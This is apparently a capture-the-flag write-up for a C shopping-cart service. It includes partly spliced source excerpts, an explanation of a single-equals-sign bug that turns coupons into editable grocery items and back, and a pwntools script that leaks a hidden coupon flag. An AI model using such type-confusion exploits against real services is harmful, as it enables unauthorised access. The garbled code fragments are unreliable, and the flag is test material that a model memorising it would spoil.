	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		loaded_coupons = true;
	}
	printf("Please enter your coupon:\n");
	char newline;
	scanf("%c", &newline); // clear newline from buffer
	fgets(user_input, STRING_BUFFER_SIZE, stdin);
	for (int i = 0; i type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}
void checkout() {
	printf("\nThank you for choosing Computed Shopping Assistant!\n");
	printf("Your items will be delivered to you within 24 hours.\n");
	printf("Goodbye!\n");
	exit(0);
}
void main_menu() {
	printf("\n---> Welcome to Computed Shopping Assistant 
## Solution
This program implements a simple shopping cart where we can buy different items. We even have the ability to apply coupons.
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ nc csa.csa-challenge.com 1111
---> Welcome to Computed Shopping Assistant coupon.discount_amount = discount;
	item->coupon.have_entered = false;
	item->coupon.is_valid = is_valid;
	item->coupon.length = strlen(coupon);
	item->coupon.expiration_day = 0;  // todo - implement expiration date check
	item->coupon.expiration_month = 0;
	item->coupon.expiration_year = 0;
	strncpy(item->coupon.code, coupon, strlen(coupon));
}
void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		loaded_coupons = true;
	}
    //...
}
```
We just want to print the other coupon. However, this is blocked by the code in `print_shopping_cart`:
```c
			case TYPE_COUPON:
				if (item->coupon.have_entered) {
					printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
				}
				break;
```
We only get the contents of the coupon if we've already entered it:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ nc csa.csa-challenge.com 1111
---> Welcome to Computed Shopping Assistant type == TYPE_UNDEFINED)) {
		printf("There is no item at selected index\n");
		return false;
	} else if 
		(((item->type == TYPE_BREAD) && (item->grocery_item.amount_loaves > 0)) || ((item->type == TYPE_PASTA) && (item->grocery_item.amount_kilograms > 0)) ||
		((item->type == TYPE_SOUP) && (item->grocery_item.amount_liters > 0)) || ((item->type == TYPE_DRINK) && (item->grocery_item.amount_liters > 0)) ||
		((item->type == TYPE_VEGETABLE) && (item->grocery_item.amount_kilograms > 0)) || ((item->type = TYPE_FRUIT) && (item->grocery_item.amount_items > 0))) {
		return true;
	} else if ((item->type = TYPE_COUPON)) {
		printf("Item is a coupon!\n");
		return false;
	} else {
		printf("Invalid item type!\n");
		return false;
	}
}
```
At first glace, though, it seems like we can't. Grocery items are editable, but coupons are certainly not. On the other hand, we can't take a grocery item and convert it to a coupon either, since that's explicitly blocked:
```c
if (choice_type == TYPE_COUPON) {
    printf("You can not convert to coupon!\n");
} 
```
So, how do we proceed? Well, a closer examination of `can_edit_item` reveals a few bugs. Did you spot them? Here they are: `(item->type = TYPE_FRUIT)` and `(item->type = TYPE_COUPON)`. In these cases, only a single equal sign is used, instead of a double equal sign. This means that the `item->type` is actually assigned instead of being compared. This is great news, since this will allow us to move between a coupon and a grocery item. We want the item to be a grocery item? We need to invoke the function while `item->grocery_item.amount_items > 0` and the item will become a fruit (returning at the first `return true`). We want it to be a coupon? We invoke the function while `item->grocery_item.amount_items == 0`, and after it becomes a fruit it continues to the next condition and then becomes a coupon (returning at the second `return false`).
So our plan is:
 1. Load the coupons
 2. Edit the second coupon (turning it into a fruit) and set the amount of kilograms to 1
 3. Edit the second coupon (now a fruit) and set the amount of items to 0
 4. (Try to) edit the second coupon (still a fruit), turning it back into a coupon
 5. Print the coupons
The following script will invoke the needed sequence:
```python
# First, generate a pwntools template with the following command:
#  pwn template --host csa.csa-challenge.com --port 1111
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
from enum import Enum
from typing import Union
class ComputedShoppingAssistant():
    class MenuOption(Enum):
        ADD_ITEM        = 1
        EDIT_ITEM       = 2
        REMOVE_ITEM     = 3
        VIEW_CART       = 4
        APPLY_COUPON    = 5
        CHECKOUT        = 6
    class ItemProperty(Enum):
        TYPE            = 1
        KILOGRAMS       = 2
        ITEMS           = 3
        LOAVES          = 4
        LITERS          = 5
        DESCRIPTION     = 6
        INVALID         = 7
    def __init__(self, io: pwnlib.tubes.tube):
        self.io = io
    def _select_menu(self, selection: "ComputedShoppingAssistant.MenuOption") -> None:
        self.io.recvuntilS(b"What would you like to do?\r\n")
        for _ in self.MenuOption:
            self.io.recvline()
        self.io.sendline(str(selection.value).encode("ascii"))
    def apply_coupon(self, coupon: str) -> bool:
        self._select_menu(self.MenuOption.APPLY_COUPON)
        self.io.sendlineafter(b"Please enter your coupon:\r\n", coupon.encode("ascii"))
        result = self.io.recvlineS()
        return result != "Invalid coupon!\r\n"
    def edit_item(self, index: int, property: "ComputedShoppingAssistant.ItemProperty", value: Union[int, str, None]) -> bool:
        self._select_menu(self.MenuOption.EDIT_ITEM)
        self.io.sendlineafter(b"Which item index would you like to edit?\r\n", str(index).encode("ascii"))
        out = self.io.recvlineS()
        if out == "Item is a coupon!\r\n":
            return False
        assert(out == "Which property would you like to edit?\r\n")
        for _ in self.ItemProperty:
            self.io.recvline()
        self.io.sendline(str(property.value).encode("ascii"))
        self.io.sendlineafter(b": ", str(value).encode("ascii"))
        out = self.io.recvlineS()
        return out == "Item updated!\r\n"
    def view_cart(self) -> str:
        self._select_menu(self.MenuOption.VIEW_CART)
        self.io.recvuntil(b'\r\nYour shopping cart has')
        self.io.recvline()
        out = self.io.recvuntilS("\r\n\r\n".encode("ascii"))
        return out.strip().split("\r\n")
    def checkout(self) -> None:
        self._select_menu(self.MenuOption.CHECKOUT)
io = start()
csa = ComputedShoppingAssistant(io)
csa.apply_coupon("NOT_A_FLAG{I_4M_A_N3WB1E}")
# Will change coupon to fruit and set amount_kilograms (i.e. have_entered) to 1
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.KILOGRAMS, 1)
# Will set amount_items to 0
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.ITEMS, 0)
# Will change fruit to coupon
csa.edit_item(1, ComputedShoppingAssistant.ItemProperty.ITEMS, None)
print(csa.view_cart())
csa.checkout()
```
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant]
└─$ python3 exploit.py
[+] Opening connection to csa.csa-challenge.com on port 1111: Done
['(index 0) - 10% OFF coupon - NOT_A_FLAG{I_4M_A_N3WB1E}', '(index 1) - 50% OFF coupon - CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}']
[*] Closed connection to csa.csa-challenge.com port 1111
```